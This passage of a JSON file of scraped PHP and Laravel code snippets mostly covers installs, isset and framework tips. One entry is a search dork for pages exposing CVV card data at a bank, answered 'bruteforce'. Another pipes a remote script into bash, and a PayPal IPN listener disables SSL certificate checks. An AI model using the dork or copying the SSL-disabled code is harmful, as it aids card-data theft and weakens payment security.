    "description": "sudo apt update sudo apt install php7.4 sudo apt install php7.4-common php7.4-mysql php7.4-xml php7.4-xmlrpc php7.4-curl php7.4-gd php7.4-imagick php7.4-cli php7.4-dev php7.4-imap php7.4-mbstring php7.4-opcache php7.4-soap php7.4-zip php7.4-intl -y\nFor install all important php 7.4 extensions apt install php7.4-common php7.4-mysql php7.4-xml php7.4-xmlrpc php7.4-curl php7.4-gd php7.4-imagick php7.4-cli php7.4-dev php7.4-imap php7.4-mbstring php7.4-opcache php7.4-soap php7.4-zip php7.4-intl -y\nsudo apt update sudo apt install php php-cli php-fpm php-json php-pdo php-mysql php-zip php-gd  php-mbstring php-curl php-xml php-pear php-bcmath \n",
    "reg_date": "2021-10-12T10:15:20.000Z"
  },
  {
    "id": 1915,
    "keyword": null,
    "link": null,
    "title": " install php8",
    "description": "# Ondřej Sur&yacute;, a Debian developer, maintains a repository that includes # multiple PHP versions. To enable the repository , run:  sudo apt install software-properties-common sudo add-apt-repository ppa:ondrej/php    # Installing PHP 8.0 with Apache    #If you&rsquo;re using Apache as a web server, #you can run PHP as an Apache module or PHP-FPM.  #Install PHP as Apache Module    #Installing PHP as an Apache module is a straightforward task:   sudo apt update sudo apt install php8.0 libapache2-mod-php8.0    #Once the packages are installed, #restart Apache for the PHP module to get loaded:    sudo systemctl restart apache2  #Configure Apache with PHP-FPM    #Php-FPM is a FastCGI process manager for PHP. #Run the following command to install the necessary packages:   sudo apt update sudo apt install php8.0-fpm libapache2-mod-fcgid  #By default PHP-FPM is not enabled in Apache. To enable it, run:  sudo a2enmod proxy_fcgi setenvif sudo a2enconf php8.0-fpm  #To activate the changes, restart Apache:  systemctl restart apache2  #Installing PHP 8.0 with Nginx    #Nginx doesn&rsquo;t have built-in support for processing PHP files. #We&rsquo;ll use PHP-FPM (&ldquo;fastCGI process manager&rdquo;) to handle the PHP files.  #Run the following commands to install PHP and PHP FPM packages:  sudo apt update sudo apt install php8.0-fpm    #Once the installation is completed, #the FPM service will start automatically. #To check the status of the service, run  systemctl status php8.0-fpm  Output   ● php8.0-fpm.service - The PHP 8.0 FastCGI Process Manager      Loaded: loaded (/lib/systemd/system/php8.0-fpm.service; enabled; vendor preset: enabled)      Active: active (running) since Thu 2020-12-03 16:10:47 UTC; 6s ago  #You can now edit the Nginx server block #and add the following lines so that Nginx can process PHP files:  server {      # . . . other code      location ~ \\.php$ {         include snippets/fastcgi-php.conf;         fastcgi_pass unix:/run/php/php8.0-fpm.sock;     }    #Do not forget to restart the Nginx service so that the new #configuration takes effect:   sudo systemctl restart nginx  #Installing PHP extensions #PHP extensions are compiled libraries that extend the core functionality #of PHP. Extensions are available as packages and can be easily #installed with apt :  sudo apt install php8.0-[extname]  #For example, to install MySQL and GD extensions, #you would run the following command:   sudo apt install php8.0-mysql php8.0-gd  #After installing a new PHP extension, #do not forget to restart Apache or PHP FPM service,  #depending on your setup.   #Testing PHP Processing #To test whether the web server is configured properly for PHP processing, #create a new file named info.php inside the /var/www/html directory #with the following code:  <?php  phpinfo();  #Save the file, open your browser, and visit: #http://your_server_ip/info.php.   #Conclusion #Installing PHP 8 on Ubuntu 20.04 server is a simple task. #All you need to do is to enable the &ldquo;ondrej/php&rdquo; repository #and install PHP 8 with apt. \n",
    "reg_date": "2021-10-12T10:15:20.000Z"
  },
  {
    "id": 1916,
    "keyword": null,
    "link": null,
    "title": " install php 5.6 on ubuntu 18.04",
    "description": "$ sudo add-apt-repository ppa:ondrej/php\nsudo apt install php7.1 php7.1-common php7.1-opcache php7.1-mcrypt php7.1-cli php7.1-gd php7.1-curl php7.1-mysql\nsudo apt install software-properties-commonsudo add-apt-repository ppa:ondrej/php\n",
    "reg_date": "2021-10-12T10:15:20.000Z"
  },
  {
    "id": 1917,
    "keyword": null,
    "link": null,
    "title": " install php 7.1 on ubuntu 18.04",
    "description": "sudo apt update sudo apt install php php-cli php-fpm php-json php-pdo php-mysql php-zip php-gd  php-mbstring php-curl php-xml php-pear php-bcmath \nsudo apt install php7.1 php7.1-common php7.1-opcache php7.1-mcrypt php7.1-cli php7.1-gd php7.1-curl php7.1-mysql\nsudo apt-get install php libapache2-mod-php\nsudo apt install software-properties-commonsudo add-apt-repository ppa:ondrej/php\n",
    "reg_date": "2021-10-12T10:15:20.000Z"
  },
  {
    "id": 1918,
    "keyword": null,
    "link": null,
    "title": " install php 7.3 on amazon linux 2",
    "description": "sudo yum install -y amazon-linux-extras sudo  amazon-linux-extras | grep php sudo amazon-linux-extras enable php7.4 sudo yum install php php7.4-{pear,cgi,common,curl,mbstring,gd,mysqlnd,gettext,bcmath,json,xml,fpm,intl,zip,imap}\n",
    "reg_date": "2021-10-12T10:15:20.000Z"
  },
  {
    "id": 1919,
    "keyword": null,
    "link": null,
    "title": " install php 7.3 ubuntu",
    "description": "sudo apt install php7.3-cli php7.3-fpm php7.3-json php7.3-pdo php7.3-mysql php7.3-zip php7.3-gd  php7.3-mbstring php7.3-curl php7.3-xml php7.3-bcmath php7.3-json\nsudo apt update sudo apt install php php-cli php-fpm php-json php-pdo php-mysql php-zip php-gd  php-mbstring php-curl php-xml php-pear php-bcmath \nsudo apt install php7.1 php7.1-common php7.1-opcache php7.1-mcrypt php7.1-cli php7.1-gd php7.1-curl php7.1-mysql\nsudo apt-get install php libapache2-mod-php\nsudo add-apt-repository ppa:ondrej/phpsudo apt-get update\nsudo apt install software-properties-commonsudo add-apt-repository ppa:ondrej/php\n",
    "reg_date": "2021-10-12T10:15:20.000Z"
  },
  {
    "id": 1920,
    "keyword": null,
    "link": null,
    "title": " install php 7.4 fpm",
    "description": "<?php // Step 1: Setup PHP with Apache2 HTTP Server  sudo apt update sudo apt install apache2  sudo systemctl stop apache2.service sudo systemctl start apache2.service sudo systemctl enable apache2.service  // Step 2: Install PHP 7.4 to Support Apache2  sudo apt-get install software-properties-common sudo add-apt-repository ppa:ondrej/php  sudo apt update  sudo apt-get install php7.4 libapache2-mod-php7.4 php7.4-cli php7.4-mysql php7.4-gd php7.4-imagick php7.4-recode php7.4-tidy php7.4-xmlrpc  // Step 3: Configure PHP 7.4 for Apache2    sudo nano /etc/php/7.4/apache2/php.ini  file_uploads = On allow_url_fopen = On memory_limit = 256M upload_max_filesize = 100M max_execution_time = 360 date.timezone = America/Chicago <IfModule mod_dir.c>      DirectoryIndex index.html index.cgi index.pl index.php index.xhtml index.htm </IfModule> # vim: syntax=apache ts=4 sw=4 sts=4 sr noet  sudo systemctl restart apache2.service ?>\nsudo apt-get update sudo apt-get install php-fpm \n",
    "reg_date": "2021-10-12T10:15:20.000Z"
  },
  {
    "id": 1921,
    "keyword": null,
    "link": null,
    "title": " install php 7.4 on ubuntu 20.04",
    "description": "sudo apt update sudo apt install php7.4 sudo apt install php7.4-common php7.4-mysql php7.4-xml php7.4-xmlrpc php7.4-curl php7.4-gd php7.4-imagick php7.4-cli php7.4-dev php7.4-imap php7.4-mbstring php7.4-opcache php7.4-soap php7.4-zip php7.4-intl -y\nsudo apt install software-properties-common sudo add-apt-repository ppa:ondrej/php  sudo apt update  sudo apt install -y php7.4\nsudo apt install software-properties-common sudo add-apt-repository ppa:ondrej/php sudo apt update sudo apt install php8.0  #install common extension  sudo apt install php8.0-common php8.0-mysql php8.0-xml php8.0-xmlrpc php8.0-curl php8.0-gd php8.0-imagick php8.0-cli php8.0-dev php8.0-imap php8.0-mbstring php8.0-opcache php8.0-soap php8.0-zip php8.0-intl -y   sudo a2dismod php7.0   sudo a2dismod php7.1   sudo a2dismod php7.2   sudo a2dismod php7.3   sudo a2dismod php7.4 sudo a2enmod php8.0 sudo service apache2 restart\n",
    "reg_date": "2021-10-12T10:15:21.000Z"
  },
  {
    "id": 1922,
    "keyword": null,
    "link": null,
    "title": " install php 7.4 ubuntu",
    "description": "sudo apt update sudo apt install php7.4 sudo apt install php7.4-common php7.4-mysql php7.4-xml php7.4-xmlrpc php7.4-curl php7.4-gd php7.4-imagick php7.4-cli php7.4-dev php7.4-imap php7.4-mbstring php7.4-opcache php7.4-soap php7.4-zip php7.4-intl -y\nFor install all important php 7.4 extensions apt install php7.4-common php7.4-mysql php7.4-xml php7.4-xmlrpc php7.4-curl php7.4-gd php7.4-imagick php7.4-cli php7.4-dev php7.4-imap php7.4-mbstring php7.4-opcache php7.4-soap php7.4-zip php7.4-intl -y\nsudo apt install php7.3-cli php7.3-fpm php7.3-json php7.3-pdo php7.3-mysql php7.3-zip php7.3-gd  php7.3-mbstring php7.3-curl php7.3-xml php7.3-bcmath php7.3-json\nsudo apt update sudo apt install php php-cli php-fpm php-json php-pdo php-mysql php-zip php-gd  php-mbstring php-curl php-xml php-pear php-bcmath \nsudo apt install php7.1 php7.1-common php7.1-opcache php7.1-mcrypt php7.1-cli php7.1-gd php7.1-curl php7.1-mysql\nsudo apt-get install php libapache2-mod-php\n",
    "reg_date": "2021-10-12T10:15:21.000Z"
  },
  {
    "id": 1923,
    "keyword": null,
    "link": null,
    "title": " install php 8 ubuntu",
    "description": "# Ubuntu 20.04 # List existing PHP packages dpkg -l | grep php | tee packages.txt  #Add ondrej/php PPA sudo add-apt-repository ppa:ondrej/php # Press enter when prompted. sudo apt-get update  #Install PHP 8.0 with CLI sudo apt install php8.0-common php8.0-cli  #Additional extensions sudo apt install php8.0- { bz2,curl,intl,mysql,readline,xml }\nsudo apt update sudo apt install php7.4 sudo apt install php7.4-common php7.4-mysql php7.4-xml php7.4-xmlrpc php7.4-curl php7.4-gd php7.4-imagick php7.4-cli php7.4-dev php7.4-imap php7.4-mbstring php7.4-opcache php7.4-soap php7.4-zip php7.4-intl -y\nsudo apt install php8.0-cli php8.0-common php8.0-imap php8.0-redis php8.0-snmp php8.0-xml\n sudo apt install php8.0\nsudo apt update sudo apt install php php-cli php-fpm php-json php-pdo php-mysql php-zip php-gd  php-mbstring php-curl php-xml php-pear php-bcmath \nsudo apt update sudo apt install lsb-release ca-certificates apt-transport-https software-properties-common -y sudo add-apt-repository ppa:ondrej/php\n",
    "reg_date": "2021-10-12T10:15:21.000Z"
  },
  {
    "id": 1924,
    "keyword": null,
    "link": null,
    "title": " install php debian 10",
    "description": "sudo apt install -y php7.4 php7.4-cli php7.4-common\nsudo apt -y install php-cli php-fpm php-json php-pdo php-mysql php-zip php-gd  php-mbstring php-curl php-xml php-pear php-bcmath\nsudo apt -y install libapache2-mod-php\n",
    "reg_date": "2021-10-12T10:15:21.000Z"
  },
  {
    "id": 1925,
    "keyword": null,
    "link": null,
    "title": " install php dom extension ubuntu",
    "description": "sudo apt-get install php-xml \n",
    "reg_date": "2021-10-12T10:15:21.000Z"
  },
  {
    "id": 1926,
    "keyword": null,
    "link": null,
    "title": " install php extensions for magento 2",
    "description": " yum -y install php74u-pdo php74u-mysqlnd php74u-opcache php74u-xml php74u-gd php74u-devel php74u-mysql php74u-intl php74u-mbstring php74u-bcmath php74u-json php74u-iconv php74u-soap \n",
    "reg_date": "2021-10-12T10:15:21.000Z"
  },
  {
    "id": 1927,
    "keyword": null,
    "link": null,
    "title": " install php fpm windows",
    "description": "Here how to setup php-fpm on Windows:  Download the .zip file from http://windows.php.net/download/. The .zip file should be VC9 which has the FastCGI file (php-cgi.exe). Don't download VC6, and don't download the .msi file because it requires that you have IIS setup already in order to install php-fpm. The zip file contains the php-cgi.exe which is what you need for php-fpm. I downloaded a slightly older version, php-5.3.10-Win32-VC9-x86.zip, from here http://windows.php.net/downloads/releases/archives/ because I wanted to match the version running on my production server.  Unzip the file, e.g. unzip into C:\\php-5.3.10-Win32-VC9-x86  Edit the php.ini file as needed. What I did:  # nginx security setting cgi.fix_pathinfo=0  extension_dir = \"C:\\php-5.3.10-Win32-VC9-x86\\ext\" enable the following modules by uncommenting them:  extension=php_curl.dll extension=php_mbstring.dll extension=php_mysqli.dll Create a .bat file somewhere, e.g. start-php-fcgi.bat in webserver directory or in the PHP directory:  @ECHO OFF ECHO Starting PHP FastCGI... set PATH=C:\\php-5.3.10-Win32-VC9-x86;%PATH% C:\\php-5.3.10-Win32-VC9-x86\\php-cgi.exe -b 127.0.0.1:9123 -c C:\\php-5.3.10-Win32-VC9-x86\\php.ini Double click the .bat file to start php-fpm. A window will popup and stay open while its running. Its kind of annoying, but just haven't looked into setting it up as service yet.  Configure your webserver. If you wish to use it with nginx, here a config sample for 127.0.0.1:9123:  location ~ \\.php$ {     fastcgi_pass    127.0.0.1:9123;     fastcgi_index   index.php;     fastcgi_param   SCRIPT_FILENAME  $document_root$fastcgi_script_name;     include         fastcgi_params; }\nsudo apt install php php-fpm\n",
    "reg_date": "2021-10-12T10:15:21.000Z"
  },
  {
    "id": 1928,
    "keyword": null,
    "link": null,
    "title": " install php linux nginx command line",
    "description": "sudo apt update && sudo apt install php-fpm\n",
    "reg_date": "2021-10-12T10:15:21.000Z"
  },
  {
    "id": 1929,
    "keyword": null,
    "link": null,
    "title": " install php mysql extension ubuntu",
    "description": "sudo apt-get install php7.2-mysql\n",
    "reg_date": "2021-10-12T10:15:21.000Z"
  },
  {
    "id": 1930,
    "keyword": null,
    "link": null,
    "title": " install phpmyadmin ubuntu",
    "description": " sudo apt-get install -y phpmyadmin  \nsudo apt install phpmyadmin \n$ sudo apt update $ sudo apt-get install phpmyadmin php-mbstring php-gettext\nsudo apt install phpmyadmin php-mbstring php-zip php-gd php-json php-curl \nsudo -i apt-get install phpmyadmin php-mbstring php-gettext -y exit\nOpen a terminal window on your Ubuntu Server. Issue the command sudo apt-get install phpmyadmin php-mbstring php-gettext -y. When prompted, type your sudo password. Allow the installation to complete.\n",
    "reg_date": "2021-10-12T10:15:21.000Z"
  },
  {
    "id": 1931,
    "keyword": null,
    "link": null,
    "title": " install phpstorm ubuntu",
    "description": "sudo snap install phpstorm --classic  sudo snap install phpstorm --classic --edge\n",
    "reg_date": "2021-10-12T10:15:22.000Z"
  },
  {
    "id": 1932,
    "keyword": null,
    "link": null,
    "title": " install phpunit on ubuntu 18.04",
    "description": "sudo apt update sudo apt install phpunit\n",
    "reg_date": "2021-10-12T10:15:22.000Z"
  },
  {
    "id": 1933,
    "keyword": null,
    "link": null,
    "title": " install soap in php linux",
    "description": "$ sudo yum install php-soap\n",
    "reg_date": "2021-10-12T10:15:22.000Z"
  },
  {
    "id": 1934,
    "keyword": null,
    "link": null,
    "title": " install tymon jwt laravel",
    "description": "composer require tymon/jwt-auth \n",
    "reg_date": "2021-10-12T10:15:22.000Z"
  },
  {
    "id": 1935,
    "keyword": null,
    "link": null,
    "title": " install zip php extension",
    "description": "sudo apt-get install php7.0-zip\n",
    "reg_date": "2021-10-12T10:15:22.000Z"
  },
  {
    "id": 1936,
    "keyword": null,
    "link": null,
    "title": " installing apache mod php",
    "description": "sudo apt install php7.2-cli sudo apt install hhvm\nsudo apt install libapache2-mod-php\n",
    "reg_date": "2021-10-12T10:15:22.000Z"
  },
  {
    "id": 1937,
    "keyword": null,
    "link": null,
    "title": " installing bootstrap ui in laravel app",
    "description": "$ php artisan ui bootstrap --auth \n$ composer require laravel/ui \n$ php artisan ui bootstrap \n$ npm install \n",
    "reg_date": "2021-10-12T10:15:22.000Z"
  },
  {
    "id": 1938,
    "keyword": null,
    "link": null,
    "title": " installing laravel 8",
    "description": "Laravel 8* install composer comand  composer create-project laravel/laravel example-app  cd example-app  php artisan serve\ncomposer create-project --prefer-dist laravel/laravel test \"8.*\"\ncomposer create-project --prefer-dist laravel/laravel ProjectName dev-develop\ncurl -s https://laravel.build/app-name | bash <!-- OR --> composer create-project --prefer-dist laravel/laravel app-name \"8.*\"\n******************************************* *** SETTING UP LARAVEL 8 (Simple steps) *** *******************************************  **Ensure you computer already has PHP and Composer installed. Then apply the CLI commands below.  ** Vist \"https://www.apachefriends.org/index.html\" to install PHP via XAMPP ** Visit \"https://getcomposer.org/\" to install composer   ENTER CLI TERMINAL COMMANDS below ------------------------------------ > composer create-project laravel/laravel example-app  > cd example-app  > php artisan serve  > composer require laravel/ui  > php artisan ui vue --auth  Now you will have to ensure you setup your database variables in the  .env file of your laravel project so you can migrate your database.  > php artisan migrate  **At this stage, your laravel app is fully ready with  login authentication for development   DEPLOY APP TO ONLINE LINUX SERVER --------------------------------- [1] Delete the file called \"Server.php\" in the Laravel Project directory  [2] Copy your laravel 8 project to your web server \"Public_html\" directory  [3] Simply copy all files in the \"Public_html\" folder of your  Laravel 8 Project and paste in the server web home directory  which is the servers own 'Public_html' folder which is also where Laravel project files are.  [4] Then update the index.php file by changing the directory levels e.g. change '/../storage/framework/maintenance.php' to '/storage/framework/maintenance.php' by removing the '../' in the directory syntax. Thats all! just refresh your browser and your app will be running fine.    -- By Atsu Emmanuel T. (Web Developer / Architecht) Email: atsuemmanuel@gmail.com   \n",
    "reg_date": "2021-10-12T10:15:22.000Z"
  },
  {
    "id": 1939,
    "keyword": null,
    "link": null,
    "title": " installing php on ubuntu",
    "description": "# Update packages lists sudo apt update  # Install Apache2 (on Ubuntu, mostly it's already installed) sudo apt install apache2  # Install the latest version of PHP and Apache wrapper sudo apt install php libapache2-mod-php  # Install some important PHP extensions, you might need to install more later sudo apt install php-{bcmath,bz2,curl,gd,json,mbstring,mysql,xml,zip}  # Install MySQL server, and remember to run mysql_secure_installation script after that sudo apt install mysql-server  # Start MySQL service sudo systemctl start mysql  # Restart Apache service to reload all changes sudo systemctl restart apache2\n# Update packages lists sudo apt update  # Install PPA sudo add-apt-repository ppa:ondrej/php  ## If you want the latest sudo apt install php ## else sepcify version number as below sudo apt install php7.3  # Install Extensions (add php version number for specific version) sudo apt-get install php7.3-fpm php7.3 php7.3-cli php7.3-mysql php7.3-gd php7.3-imagick php7.3-recode php7.3-tidy php7.3-xmlrpc php7.3-common php7.3-curl php7.3-mbstring php7.3-xml php7.3-bcmath php7.3-bz2 php7.3-intl php7.3-json php7.3-readline php7.3-zip  # Install the latest version of PHP and Apache wrapper sudo apt install php libapache2-mod-php ## else if you installed a specific version of PHP sudo apt install php libapache2-mod-php7.3  # Enable PHP (can type sudo a2enmod php, then push tab to see listed versions) sudo a2enmod php7.3  # Restart Apache Service sudo service apache2 restart\napt-get install php-pear php-fpm php-dev php-zip php-curl php-xmlrpc php-gd php-mysql php-mbstring php-xml libapache2-mod-php\napt-get install php\nsudo apt install php libapache2-mod-php  # restart it sudo systemctl restart apache2\nsudo apt install php7.2-cli sudo apt install hhvm\n",
    "reg_date": "2021-10-12T10:15:22.000Z"
  },
  {
    "id": 1940,
    "keyword": null,
    "link": null,
    "title": " integer default value laravel",
    "description": "$table->integer('estado')->default(0);\n",
    "reg_date": "2021-10-12T10:15:22.000Z"
  },
  {
    "id": 1941,
    "keyword": null,
    "link": null,
    "title": " integer division in php",
    "description": "$a = 5; $b = 2; echo intdiv($a, $b); // 2\n$a / $b\tDivision\tQuotient of $a and $b.\n",
    "reg_date": "2021-10-12T10:15:22.000Z"
  },
  {
    "id": 1942,
    "keyword": null,
    "link": null,
    "title": " integer nullable laravel",
    "description": "$table->integer('banner_id')->nullable()->unsigned();\n",
    "reg_date": "2021-10-12T10:15:22.000Z"
  },
  {
    "id": 1943,
    "keyword": null,
    "link": null,
    "title": " integer to string php",
    "description": "return strval($integer);\n$number = 11; // This echo strval($number); // Or This echo (String) $number; // Output // \"11\" // \"11\"\n$var = 5;  // Inline variable parsing echo \"I'd like {$var} waffles\"; // = \"I'd like 5 waffles  // String concatenation  echo \"I'd like \".$var.\" waffles\"; // I'd like 5 waffles  // Explicit cast  $items = (string)$var; // $items === \"5\";  // Function call $items = strval($var); // $items === \"5\"; \nphpCopy<?php   $variable = 10; $string1 = strval($variable); echo \"The variable is converted to a string and its value is $string1.\";   ?> \n<?php class StrValTest {     public function __toString()     {         return __CLASS__;     } }  // Prints 'StrValTest' echo strval(new StrValTest); ?>\nphpCopy<?php   $variable = 10; $string1 = (string)$variable; echo \"The variable is converted to a string and its value is $string1.\";   ?> \n",
    "reg_date": "2021-10-12T10:15:23.000Z"
  },
  {
    "id": 1944,
    "keyword": null,
    "link": null,
    "title": " intellij insert shortcut",
    "description": "alt + insert\n",
    "reg_date": "2021-10-12T10:15:23.000Z"
  },
  {
    "id": 1945,
    "keyword": null,
    "link": null,
    "title": " inurl:.php?cid= intext:CVV TD bank",
    "description": "bruteforce \n",
    "reg_date": "2021-10-12T10:15:23.000Z"
  },
  {
    "id": 1946,
    "keyword": null,
    "link": null,
    "title": " invalid argument supplied for foreach()",
    "description": "<?php if (is_array($array) || is_object($array)) {     foreach ($array as $row)     {         ...     } } ?>\n$array = ['dog', 'cat', 'lion'];  if (!empty($array) && isset($array) && is_array($array) {     //loop     foreach ($array as $values) {         echo $values;      } } \n",
    "reg_date": "2021-10-12T10:15:23.000Z"
  },
  {
    "id": 1947,
    "keyword": null,
    "link": null,
    "title": " invalid datetime format 1292",
    "description": "$lastupdated = date('Y-m-d H:i:s'); \n",
    "reg_date": "2021-10-12T10:15:23.000Z"
  },
  {
    "id": 1948,
    "keyword": null,
    "link": null,
    "title": " invalid datetime format laravel",
    "description": "change format to Y-m-d and for datetime is Y-m-d H:i:s\n",
    "reg_date": "2021-10-12T10:15:23.000Z"
  },
  {
    "id": 1949,
    "keyword": null,
    "link": null,
    "title": " ip condition in php",
    "description": "if ($_SERVER['REMOTE_ADDR'] == 'xxx.xxx.xxx.x' ) {   //your code here }\n",
    "reg_date": "2021-10-12T10:15:23.000Z"
  },
  {
    "id": 1950,
    "keyword": null,
    "link": null,
    "title": " ipn listener paypel php",
    "description": "   // example for laravel \tpublic function listener(Request $request)     {          $ch = curl_init();         curl_setopt($ch, CURLOPT_URL, 'https://ipnpb.sandbox.paypal.com/cgi-bin/webscr');         curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);         curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);         curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);         curl_setopt($ch, CURLOPT_POST, 1);         curl_setopt($ch, CURLOPT_POSTFIELDS, \"cmd=_notify-validate&\" . http_build_query($_POST));         $response = curl_exec($ch);         curl_close($ch);           if ($response == \"VERIFIED\") {              $this->payerEmail = $_POST['payer_email'];             $this->name = $_POST['first_name'] . \" \" . $_POST['last_name'];             $this->price = $_POST['mc_gross'];             $this->currency = $_POST['mc_currency'];             $this->paymentStatus = $_POST['payment_status'];             $this->amount = $_POST['quantity'];             $this->purchase_id = $_POST['txn_id'];              //$this->other             //$this->other1             if ($this->paymentStatus == \"Completed\") { \t\t\t\t\t\t// code if             } else {                               // code else             }         }     }\n",
    "reg_date": "2021-10-12T10:15:23.000Z"
  },
  {
    "id": 1951,
    "keyword": null,
    "link": null,
    "title": " is cacade work on soft delete in laravel",
    "description": " put this code in model:  protected static function boot() {     parent::boot();      static::deleting(function($offer) {         $offer->services()->delete();     }); }  And added missing     use SoftDeletes; protected $dates = ['deleted_at'];\n",
    "reg_date": "2021-10-12T10:15:23.000Z"
  },
  {
    "id": 1952,
    "keyword": null,
    "link": null,
    "title": " is curl faster than file get contents php",
    "description": "cURL is faster than file_get_contents()\n",
    "reg_date": "2021-10-12T10:15:23.000Z"
  },
  {
    "id": 1953,
    "keyword": null,
    "link": null,
    "title": " is frontpage wordpress",
    "description": "if ( is_front_page() ) :     get_header( 'front' ); else :     get_header(); endif;\n",
    "reg_date": "2021-10-12T10:15:24.000Z"
  },
  {
    "id": 1954,
    "keyword": null,
    "link": null,
    "title": " is home page if wordpress",
    "description": "// Determines whether the query is for the blog homepage. is_home()\nis_home()\n",
    "reg_date": "2021-10-12T10:15:24.000Z"
  },
  {
    "id": 1955,
    "keyword": null,
    "link": null,
    "title": " is number divisible by 3 php",
    "description": "if($number % 15 == 0)  {     echo \"BY3 AND 5\"; } elseif ($number % 5 == 0) {     echo \"BY5\"; } elseif ($number % 3 == 0) {     echo \"BY3\"; }\n",
    "reg_date": "2021-10-12T10:15:24.000Z"
  },
  {
    "id": 1956,
    "keyword": null,
    "link": null,
    "title": " is php a case sensitive language?",
    "description": "PHP is partially case sensitive. The variable names are case-sensitive but function names are not. \n",
    "reg_date": "2021-10-12T10:15:24.000Z"
  },
  {
    "id": 1957,
    "keyword": null,
    "link": null,
    "title": " is php still used",
    "description": "Sure it is!!! Most of current framework are base on php (magento, wordpress, laravel, codeigniter...).    Don't worry about that! ;)\n",
    "reg_date": "2021-10-12T10:15:24.000Z"
  },
  {
    "id": 1958,
    "keyword": null,
    "link": null,
    "title": " is php the fucking worst",
    "description": "Why yes, yes it is Edit: No Java is\n",
    "reg_date": "2021-10-12T10:15:24.000Z"
  },
  {
    "id": 1959,
    "keyword": null,
    "link": null,
    "title": " is unique in codeigniter form validation",
    "description": "$this->form_validation->set_rules('order_no', 'Order no', 'required|callback_check_order_no'); \nfunction check_unique_order_no($id = '', $order_no) {         $this->db->where('order_no', $order_no);         $this->db->where('status', \"A\");          if($id) {             $this->db->where_not_in('id', $id);         }         return $this->db->get('delivery_order')->num_rows();     } \nfunction check_order_no($order_no) {                 if($this->input->post('id'))             $id = $this->input->post('id');         else             $id = '';         $result = $this->Data_model->check_unique_order_no($id, $order_no);         if($result == 0)             $response = true;         else {             $this->form_validation->set_message('check_order_no', 'Order no already exist');             $response = false;         }         return $response;     } \n",
    "reg_date": "2021-10-12T10:15:24.000Z"
  },
  {
    "id": 1960,
    "keyword": null,
    "link": null,
    "title": " is users logged in laravel blade",
    "description": "$id = Auth::user()->id;print_r($id);\n@auth   // user logged in   @else   // not logged in @endauth\n$user = auth()->user();  print($user->id);print($user->name);print($user->email);\n$user = Auth::user();  echo $user->id;  echo $user->name;  echo $user->email;\n",
    "reg_date": "2021-10-12T10:15:24.000Z"
  },
  {
    "id": 1961,
    "keyword": null,
    "link": null,
    "title": " isset function in php",
    "description": "if(isset($_POST['submit']){ //Your Code Here }\nif(isset($_GET['id'])) {    $slide = $_GET['id'] // Getting parameter value inside PHP variable }\nif (isset($variable)) { /* do something */ };\nif (isset($var)) {   // Code here }\n<!DOCTYPE html> <html lang=\"en\"> <head>     <meta charset=\"UTF-8\">     <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">     <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">     <title>Document</title> </head> <body>     <form action=\"\" method=\"post\">         <h1>ISSET Demo</h1>         <input type=\"submit\" value=\"Click here\" name=\"btn1\">     </form> </body> </html> <?php if(isset($_POST['btn1'])) {     echo \"button was set!\"; } ?>\n/**  * Returns a bool (true or false)  */ isset($x); /**  * Examples  */ $x = 'myValue'; if(isset($x)){ \techo 'x is set'; } /**  * this will echo out 'x is set'  */   $x = null; if(isset($x)){ \techo 'x is set'; } /**  * This will NOT echo out 'x is set'  */   if(isset($y)){  \techo 'y is set';  } /**  * This will NOT echo out 'y is set'  */  \n",
    "reg_date": "2021-10-12T10:15:24.000Z"
  },
  {
    "id": 1962,
    "keyword": null,
    "link": null,
    "title": " isset in php",
    "description": "if (isset($var)) {   // Code here }\n<!DOCTYPE html> <html lang=\"en\"> <head>     <meta charset=\"UTF-8\">     <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">     <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">     <title>Document</title> </head> <body>     <form action=\"\" method=\"post\">         <h1>ISSET Demo</h1>         <input type=\"submit\" value=\"Click here\" name=\"btn1\">     </form> </body> </html> <?php if(isset($_POST['btn1'])) {     echo \"button was set!\"; } ?>\n/**  * Returns a bool (true or false)  */ isset($x); /**  * Examples  */ $x = 'myValue'; if(isset($x)){ \techo 'x is set'; } /**  * this will echo out 'x is set'  */   $x = null; if(isset($x)){ \techo 'x is set'; } /**  * This will NOT echo out 'x is set'  */   if(isset($y)){  \techo 'y is set';  } /**  * This will NOT echo out 'y is set'  */  \n$age = 0; // Evaluates as true because $age is set if (isset($age)) { echo '$age is set even though it is empty'; }\nThe isset() function checks whether a variable is set, which means that it has to be declared and is not NULL.  This function returns true if the variable exists and is not NULL, otherwise it returns false.\n//with new features in new PHP versions like 7 //you can simplify writing of isset in the following way, //old way of isset to display name if name variable is not null echo isset($name) ? $name : \"no name\"  //new and simple way with null coalescing operator echo $name ?? \"no name\"\n",
    "reg_date": "2021-10-12T10:15:24.000Z"
  },
  {
    "id": 1963,
    "keyword": null,
    "link": null,
    "title": " isset laravel",
    "description": "<!DOCTYPE html> <html> \t<head> \t\t<title> \t\t</title> \t</head>   \t   \t<body>         @isset($user)             <p> user variable is define.</p>         @endisset          @isset($status)             <p> status variable define.</p>         @endisset          @if(isset($admin))             <p> admin variable is define.</p>         @else             <p> admin variable is not define.</p>         @endif   \t</body> </html>\n//In Controller public function returnView() {     return View::make('view')->with('param',$param); }  //In View @isset($param)\n/**  * Returns a bool (true or false)  */ isset($x); /**  * Examples  */ $x = 'myValue'; if(isset($x)){ \techo 'x is set'; } /**  * this will echo out 'x is set'  */   $x = null; if(isset($x)){ \techo 'x is set'; } /**  * This will NOT echo out 'x is set'  */   if(isset($y)){  \techo 'y is set';  } /**  * This will NOT echo out 'y is set'  */  \n",
    "reg_date": "2021-10-12T10:15:25.000Z"
  },
  {
    "id": 1964,
    "keyword": null,
    "link": null,
    "title": " isset submit in php",
    "description": "if(isset($_POST['submit']){ //Your Code Here }\n<!DOCTYPE html> <html lang=\"en\"> <head>     <meta charset=\"UTF-8\">     <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">     <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">     <title>Document</title> </head> <body>     <form action=\"\" method=\"post\">         <h1>ISSET Demo</h1>         <input type=\"submit\" value=\"Click here\" name=\"btn1\">     </form> </body> </html> <?php if(isset($_POST['btn1'])) {     echo \"button was set!\"; } ?>\n",
    "reg_date": "2021-10-12T10:15:25.000Z"
  },
  {
    "id": 1965,
    "keyword": null,
    "link": null,
